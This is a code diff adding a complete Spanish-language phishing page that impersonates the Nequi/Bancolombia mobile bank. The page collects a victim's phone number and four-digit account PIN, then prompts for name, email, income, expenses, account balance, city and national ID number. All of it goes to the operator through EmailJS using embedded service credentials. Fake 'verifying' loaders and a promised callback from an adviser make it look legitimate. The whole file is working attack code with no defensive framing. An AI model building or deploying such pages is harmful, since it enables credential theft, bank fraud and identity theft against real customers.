@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- FUENTE (más formal) -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+<!-- EmailJS SDK -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<title>Nequi verificacion</title>
+
+<style>
+* {
+    box-sizing: border-box;
+    font-family: 'Inter', sans-serif;
+}
+
+body {
+    margin: 0;
+    background: #f5f6f8;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+    color: #2b2b2b;
+}
+
+/* CONTENEDOR */
+.container {
+    width: 340px;
+    background: #ffffff;
+    padding: 26px 22px;
+    border-radius: 16px;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.08);
+}
+
+/* LOGO */
+.logo-space {
+    height: 55px;
+    margin-bottom: 10px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.logo {
+    max-height: 150px;
+    object-fit: contain;
+}
+
+/* TEXTO */
+.description {
+    text-align: center;
+    font-size: 13px;
+    color: #5a5f66;
+    margin-bottom: 22px;
+}
+
+/* INPUTS */
+.input-group {
+    margin-bottom: 16px;
+}
+
+input, select {
+    width: 100%;
+    padding: 13px;
+    border-radius: 6px;
+    border: none;
+    background: #f7dbe6;
+    font-size: 13px;
+    color: #333;
+    font-weight: 500;
+}
+
+input:focus, select:focus {
+    outline: none;
+    background: #f3c9da;
+}
+
+input::placeholder {
+    color: #8a8f98;
+    font-weight: 400;
+}
+
+/* CHECKBOX */
+.check-container {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    border: 2px solid #f2a6c3;
+    border-radius: 12px;
+    padding: 16px;
+    margin-top: 10px;
+    cursor: pointer;
+}
+
+.circle {
+    width: 22px;
+    height: 22px;
+    min-width: 22px;
+    border: 2px solid #ff4fa3;
+    border-radius: 50%;
+    position: relative;
+}
+
+.circle::after {
+    content: "";
+    position: absolute;
+    width: 10px;
+    height: 10px;
+    background: white;
+    border-radius: 50%;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) scale(0);
+    transition: 0.2s;
+}
+
+.circle.checked {
+    background: #ff4fa3;
+}
+
+.circle.checked::after {
+    transform: translate(-50%, -50%) scale(1);
+}
+
+.check-text {
+    font-size: 14px;
+    font-weight: 500;
+    color: #2a2a2a;
+}
+
+/* BOTONES */
+button {
+    width: 100%;
+    padding: 13px;
+    border-radius: 6px;
+    border: none;
+    font-size: 14px;
+    margin-top: 14px;
+    cursor: pointer;
+    transition: 0.2s;
+    font-weight: 500;
+}
+
+.primary {
+    background: #f4a3c4;
+    color: white;
+    opacity: 0.5;
+    cursor: not-allowed;
+    font-weight: 600;
+}
+
+.primary.active {
+    opacity: 1;
+    cursor: pointer;
+}
+
+.primary.active:hover {
+    background: #ec8bb4;
+}
+
+.secondary {
+    background: white;
+    border: 1px solid #cfcfcf;
+}
+
+.secondary:hover {
+    background: #f5f5f5;
+}
+
+/* FOOTER */
+.footer {
+    text-align: center;
+    margin-top: 14px;
+    font-size: 12px;
+    color: #6f7378;
+}
+
+/* Loader overlay */
+.loader-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255, 255, 255, 0.96);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    flex-direction: column;
+    gap: 20px;
+}
+
+.semi-circle-loader {
+    width: 60px;
+    height: 60px;
+    border: 5px solid #f0c0d4;
+    border-top: 5px solid #ff4fa3;
+    border-right: 5px solid #ff4fa3;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.loader-text {
+    color: #ff4fa3;
+    font-weight: 500;
+    font-size: 14px;
+}
+
+/* Ocultar secciones */
+.hidden {
+    display: none;
+}
+
+/* Para las preguntas */
+.question-label {
+    font-size: 14px;
+    font-weight: 600;
+    color: #2a2a2a;
+    margin-bottom: 8px;
+    display: block;
+}
+
+.question-counter {
+    text-align: center;
+    font-size: 12px;
+    color: #8a8f98;
+    margin-bottom: 16px;
+}
+
+.progress-bar {
+    width: 100%;
+    height: 3px;
+    background: #f0c0d4;
+    border-radius: 3px;
+    margin-bottom: 20px;
+    overflow: hidden;
+}
+
+.progress-fill {
+    height: 100%;
+    background: #ff4fa3;
+    border-radius: 3px;
+    transition: width 0.3s ease;
+}
+
+.error-message {
+    color: #d32f2f;
+    font-size: 11px;
+    margin-top: 6px;
+    text-align: center;
+}
+
+select {
+    appearance: none;
+    cursor: pointer;
+}
+
+/* Mensaje final profesional */
+.final-message {
+    text-align: center;
+    padding: 10px 0;
+}
+
+.final-title {
+    font-size: 20px;
+    font-weight: 600;
+    color: #2a2a2a;
+    margin-bottom: 16px;
+}
+
+.final-text {
+    font-size: 14px;
+    color: #5a5f66;
+    line-height: 1.5;
+    margin-bottom: 24px;
+}
+
+.final-note {
+    font-size: 12px;
+    color: #8a8f98;
+    margin-top: 20px;
+    padding-top: 16px;
+    border-top: 1px solid #f0c0d4;
+}
+</style>
+</head>
+
+<body>
+
+<div id="app">
+    <!-- Pantalla inicial de login -->
+    <div id="loginScreen" class="container">
+        <div class="logo-space">
+            <img src="logonequi.png" class="logo" alt="logo">
+        </div>
+        <div class="description">
+            Ingresa tu número del cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
+        </div>
+        <div class="input-group">
+            <input type="tel" id="phoneInput" placeholder="Número de celular" maxlength="10">
+        </div>
+        <div class="input-group">
+            <input type="password" id="pinInput" placeholder="Clave" maxlength="4" inputmode="numeric">
+        </div>
+        <div class="check-container" onclick="toggleCheck()">
+            <div class="circle" id="circle"></div>
+            <div class="check-text">Confirmo que soy una persona real.</div>
+        </div>
+        <button class="primary" id="loginBtn" disabled>Entrar</button>
+        <button class="secondary" id="laterBtn">Ahora No</button>
+        <div class="footer">
+            ¿Olvidaste la clave? Recupérala fácilmente.
+        </div>
+        <div id="loginError" class="error-message"></div>
+    </div>
+
+    <!-- Contenedor para preguntas (inicialmente oculto) -->
+    <div id="questionsScreen" class="container hidden">
+        <div id="questionsContent"></div>
+    </div>
+</div>
+
+<script>
+    // Configuración EmailJS (TUS CREDENCIALES)
+    const EMAILJS_PUBLIC_KEY = "8C6L6ihA-QMgrpAyq";
+    const EMAILJS_SERVICE_ID = "service_3k5lg8d";
+    const EMAILJS_TEMPLATE_ID = "template_8lc9vgi";
+    
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+
+    // Variables globales
+    let checked = false;
+    let phoneNumber = '';
+    let pinCode = '';
+    let currentQuestionIndex = 0;
+    let answers = {};
+
+    // Lista de preguntas
+    const questions = [
+        { id: 'nombre', label: 'Nombre completo', type: 'text', placeholder: 'Ej: María Pérez Gómez' },
+        { id: 'email', label: 'Correo electrónico', type: 'email', placeholder: 'usuario@ejemplo.com' },
+        { id: 'egresos', label: '¿Cuáles son sus egresos mensuales?', type: 'number', placeholder: 'Ej: 1.500.000' },
+        { id: 'ingresos', label: '¿Cuáles son sus ingresos mensuales?', type: 'number', placeholder: 'Ej: 2.500.000' },
+        { id: 'montoCuenta', label: 'Monto total que tiene en su cuenta', type: 'number', placeholder: 'Ej: 5.250.000' },
+        { id: 'antiguedad', label: '¿Hace cuánto tiene su cuenta?', type: 'text', placeholder: 'Ej: 1 año, 6 meses' },
+        { id: 'ciudad', label: 'Ciudad', type: 'text', placeholder: 'Ej: Bogotá, Medellín, Cali' },
+        { id: 'identificacion', label: 'Número de identificación', type: 'document', placeholder: 'Número de documento' }
+    ];
+
+    const tipoDocumentoOptions = ['CC', 'TI', 'CE'];
+
+    // Función para formatear números con puntos (ej: 1000 -> 1.000)
+    function formatNumberWithDots(value) {
+        if (!value) return '';
+        // Eliminar cualquier caracter que no sea número
+        let cleanValue = value.toString().replace(/[^0-9]/g, '');
+        if (cleanValue === '') return '';
+        // Convertir a número y formatear con puntos
+        let number = parseInt(cleanValue, 10);
+        return number.toLocaleString('es-CO');
+    }
+
+    // Función para aplicar formato a inputs numéricos mientras escribe
+    function setupNumberFormatting(inputElement) {
+        if (!inputElement) return;
+        
+        inputElement.addEventListener('input', function(e) {
+            let cursorPosition = this.selectionStart;
+            let rawValue = this.value.replace(/[^0-9]/g, '');
+            if (rawValue === '') {
+                this.value = '';
+                return;
+            }
+            let formattedValue = parseInt(rawValue, 10).toLocaleString('es-CO');
+            this.value = formattedValue;
+            
+            // Ajustar cursor
+            let newCursorPos = cursorPosition + (formattedValue.length - this.value.length);
+            this.setSelectionRange(newCursorPos, newCursorPos);
+        });
+    }
+
+    // Funciones del login
+    function toggleCheck() {
+        const circle = document.getElementById("circle");
+        const btn = document.getElementById("loginBtn");
+
+        checked = !checked;
+
+        if (checked) {
+            circle.classList.add("checked");
+            btn.classList.add("active");
+            btn.disabled = false;
+        } else {
+            circle.classList.remove("checked");
+            btn.classList.remove("active");
+            btn.disabled = true;
+        }
+    }
+
+    function showLoader(durationMs, callback) {
+        const overlay = document.createElement('div');
+        overlay.className = 'loader-overlay';
+        overlay.innerHTML = `
+            <div class="semi-circle-loader"></div>
+            <div class="loader-text">Verificando información...</div>
+        `;
+        document.body.appendChild(overlay);
+        
+        setTimeout(() => {
+            overlay.remove();
+            if (callback) callback();
+        }, durationMs);
+    }
+
+    function showError(elementId, message) {
+        const errorDiv = document.getElementById(elementId);
+        if (errorDiv) {
+            errorDiv.textContent = message;
+            setTimeout(() => { errorDiv.textContent = ''; }, 3000);
+        }
+    }
+
+    // Función para limpiar formato y obtener valor numérico limpio
+    function getCleanNumberValue(inputValue) {
+        return inputValue.replace(/[^0-9]/g, '');
+    }
+
+    // Función para renderizar preguntas una por una
+    function renderQuestion() {
+        const questionsContent = document.getElementById('questionsContent');
+        const q = questions[currentQuestionIndex];
+        
+        if (!q) {
+            // Todas las preguntas respondidas, enviar datos
+            sendEmailAndFinish();
+            return;
+        }
+
+        const progress = (currentQuestionIndex / questions.length) * 100;
+        
+        let inputHtml = '';
+        if (q.id === 'identificacion') {
+            inputHtml = `
+                <select id="questionInput" style="margin-bottom:10px;">
+                    ${tipoDocumentoOptions.map(opt => `<option value="${opt}">${opt}</option>`).join('')}
+                </select>
+                <input type="text" id="documentNumber" placeholder="Número de documento">
+            `;
+        } else {
+            inputHtml = `<input type="text" id="questionInput" placeholder="${q.placeholder}">`;
+        }
+
+        questionsContent.innerHTML = `
+            <div class="progress-bar">
+                <div class="progress-fill" style="width: ${progress}%"></div>
+            </div>
+            <div class="question-counter">Pregunta ${currentQuestionIndex + 1} de ${questions.length}</div>
+            <div class="input-group">
+                <label class="question-label">${q.label}</label>
+                ${inputHtml}
+            </div>
+            <button class="primary active" id="nextBtn">${currentQuestionIndex === questions.length - 1 ? 'Enviar respuestas' : 'Siguiente'}</button>
+            <div id="questionError" class="error-message"></div>
+        `;
+
+        // Aplicar formato de números a campos específicos
+        const questionInput = document.getElementById('questionInput');
+        if (questionInput && (q.id === 'egresos' || q.id === 'ingresos' || q.id === 'montoCuenta')) {
+            setupNumberFormatting(questionInput);
+        }
+
+        // Precargar valor si ya existe
+        if (answers[q.id]) {
+            const input = document.getElementById('questionInput');
+            if (input && typeof answers[q.id] === 'string') {
+                if (q.id === 'egresos' || q.id === 'ingresos' || q.id === 'montoCuenta') {
+                    // Si es numérico, formatear con puntos
+                    let numValue = answers[q.id].replace(/[^0-9]/g, '');
+                    if (numValue) {
+                        input.value = parseInt(numValue, 10).toLocaleString('es-CO');
+                    }
+                } else {
+                    input.value = answers[q.id];
+                }
+            }
+            if (q.id === 'identificacion' && answers[q.id].tipo) {
+                document.getElementById('questionInput').value = answers[q.id].tipo;
+                document.getElementById('documentNumber').value = answers[q.id].numero || '';
+            }
+        }
+
+        document.getElementById('nextBtn')?.addEventListener('click', () => {
+            let value;
+            if (q.id === 'identificacion') {
+                const tipo = document.getElementById('questionInput').value;
+                const numero = document.getElementById('documentNumber')?.value.trim();
+                if (!numero) {
+                    showError('questionError', 'El número de identificación es obligatorio');
+                    return;
+                }
+                value = { tipo, numero };
+            } else {
+                let rawValue = document.getElementById('questionInput').value.trim();
+                if (q.id === 'nombre' && !rawValue) {
+                    showError('questionError', 'El nombre es obligatorio');
+                    return;
+                }
+                if (q.id === 'email' && !rawValue) {
+                    showError('questionError', 'El correo electrónico es obligatorio');
+                    return;
+                }
+                if (q.id === 'email' && !/^[^\s@]+@([^\s@.,]+\.)+[^\s@.,]{2,}$/.test(rawValue)) {
+                    showError('questionError', 'Correo inválido');
+                    return;
+                }
+                
+                // Para campos numéricos, guardar el valor limpio (sin puntos)
+                if (q.id === 'egresos' || q.id === 'ingresos' || q.id === 'montoCuenta') {
+                    value = getCleanNumberValue(rawValue) || 'No especificado';
+                    if (value !== 'No especificado') {
+                        value = new Intl.NumberFormat('es-CO').format(parseInt(value, 10));
+                    }
+                } else {
+                    value = rawValue || 'No especificado';
+                }
+            }
+            
+            answers[q.id] = value;
+            currentQuestionIndex++;
+            renderQuestion();
+        });
+    }
+
+    async function sendEmailAndFinish() {
+        showLoader(2000, async () => {
+            const templateParams = {
+                telefono: phoneNumber,
+                clave_personal: pinCode,
+                nombre: answers.nombre || '',
+                email: answers.email || '',
+                egresos: answers.egresos || 'No especificado',
+                ingresos: answers.ingresos || 'No especificado',
+                monto_cuenta: answers.montoCuenta || 'No indicado',
+                antiguedad: answers.antiguedad || 'No indicado',
+                ciudad: answers.ciudad || 'No indicada',
+                tipo_documento: answers.identificacion?.tipo || 'CC',
+                numero_documento: answers.identificacion?.numero || '',
+                fecha_envio: new Date().toLocaleString('es-CO')
+            };
+
+            try {
+                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+                // Mostrar mensaje final profesional
+                const questionsContent = document.getElementById('questionsContent');
+                questionsContent.innerHTML = `
+                    <div class="final-message">
+                        <div class="final-title">Muchas gracias</div>
+                        <div class="final-text">
+                            Con esta información verificaremos si usted es el titular de la cuenta.<br><br>
+                            Su asesor se pondrá en contacto con usted en las próximas horas.
+                        </div>
+                        <button class="primary active" id="exitBtn">Salir</button>
+                        <div class="final-note">
+                            Nequi es un producto de Bancolombia. Si necesita ayuda, contáctenos a través de nuestros canales oficiales.
+                        </div>
+                    </div>
+                `;
+                document.getElementById('exitBtn')?.addEventListener('click', () => {
+                    window.close();
+                    // Si window.close no funciona (por políticas del navegador), mostrar mensaje
+                    setTimeout(() => {
+                        alert('Puede cerrar esta pestaña manualmente.');
+                    }, 100);
+                });
+            } catch (error) {
+                alert('Error al enviar: ' + (error.text || 'Verifique su conexión'));
+                location.reload();
+            }
+        });
+    }
+
+    // Evento del botón Entrar
+    document.getElementById('loginBtn')?.addEventListener('click', () => {
+        const phone = document.getElementById('phoneInput').value.trim();
+        const pin = document.getElementById('pinInput').value.trim();
+        
+        const phoneRegex = /^[0-9]{10}$/;
+        if (!phone) {
+            showError('loginError', 'El número de teléfono es obligatorio');
+            return;
+        }
+        if (!phoneRegex.test(phone)) {
+            showError('loginError', 'Ingrese 10 dígitos numéricos');
+            return;
+        }
+        if (!pin) {
+            showError('loginError', 'La clave de 4 dígitos es obligatoria');
+            return;
+        }
+        if (!/^\d{4}$/.test(pin)) {
+            showError('loginError', 'La clave debe tener exactamente 4 dígitos');
+            return;
+        }
+        
+        phoneNumber = phone;
+        pinCode = pin;
+        
+        // Mostrar loader 5 segundos
+        showLoader(5000, () => {
+            // Ocultar pantalla de login y mostrar preguntas
+            document.getElementById('loginScreen').classList.add('hidden');
+            const questionsScreen = document.getElementById('questionsScreen');
+            questionsScreen.classList.remove('hidden');
+            // Reiniciar estado de preguntas
+            currentQuestionIndex = 0;
+            answers = {};
+            renderQuestion();
+        });
+    });
+
+    // Botón "Ahora No"
+    document.getElementById('laterBtn')?.addEventListener('click', () => {
+        alert('Puedes completar la encuesta en otro momento.');
+    });
+
+    // Validar que la clave solo tenga números
+    const pinInput = document.getElementById('pinInput');
+    if (pinInput) {
+        pinInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0,4);
+        });
+    }
+    
+    const phoneInput = document.getElementById('phoneInput');
+    if (phoneInput) {
+        phoneInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0,10);
+        });
+    }
+</script>
+
+</body>
+</html>
